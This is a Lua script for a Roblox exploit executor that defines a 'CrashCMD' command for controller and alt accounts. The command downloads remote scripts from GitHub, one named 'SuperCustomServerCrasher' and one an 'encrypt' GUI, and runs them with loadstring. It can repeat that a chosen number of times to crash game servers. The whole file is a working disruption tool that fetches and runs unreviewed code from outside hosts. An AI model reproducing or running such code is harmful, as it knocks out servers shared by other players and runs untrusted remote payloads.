getgenv().HasRunnedCrashCMD = true

getgenv().CrashCMD = function(args)
    setfpscap(200)
    if game.Players.LocalPlayer.UserId == getgenv().alts['Alt1'] or game.Players.LocalPlayer.UserId == getgenv().controller then
        if args[2] then
            if args[2]:lower() == 'swag' then
                if args[3] then
                    if tonumber(args[3]) then
                        local thefinal = tonumber(args[3])
                        for k = 1, thefinal do
                            loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
                        end
                        if args[4] then
                            if tonumber(args[4]) then
                                setfpscap(tonumber(args[4]))
                            end
                        end
                    else
                        getgenv().MUF_sendChatMessage('the argument 2 must be number(s) not string')
                    end
                else
                    loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
                    getgenv().MUF_sendChatMessage('Loaded Swag On Alt1 & Controller!!')
                end
            elseif args[2]:lower() == 'encrypt' then
                if args[3] then
                    if tonumber(args[3]) then
                        local thefinal = tonumber(args[3])
                        for k = 1, thefinal do
                            loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/encryptgui.lua"))()
                        end
                        if args[4] then
                            if tonumber(args[4]) then
                                setfpscap(tonumber(args[4]))
                            end
                        end
                    else
                        getgenv().MUF_sendChatMessage('the argument 2 must be number(s) not string')
                    end
                else
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/encryptgui.lua"))()
                    getgenv().MUF_sendChatMessage('Loaded Encrypt On Alt1 & Controller!')
                end
            end
        else
            loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
            getgenv().MUF_sendChatMessage('Loaded Swag On Alt1 & Controller!!')
        end
    end
end